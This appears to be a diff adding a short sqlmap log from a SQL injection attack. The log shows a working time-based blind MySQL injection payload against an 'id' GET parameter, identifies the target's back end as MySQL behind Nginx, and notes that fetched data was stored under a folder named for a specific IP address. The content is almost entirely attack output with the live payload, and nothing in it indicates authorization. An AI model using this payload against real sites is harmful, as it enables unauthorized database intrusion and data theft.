@@ -1,0 +1,11 @@
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
+    Payload: id=(CASE WHEN (1734=1734) THEN SLEEP(5) ELSE 1734 END)
+---
+[16:13:40] [INFO] the back-end DBMS is MySQL
+web application technology: Nginx
+back-end DBMS: MySQL 5
+[16:13:40] [INFO] fetched data logged to text files under '/root/.sqlmap/output/74.220.213.78'
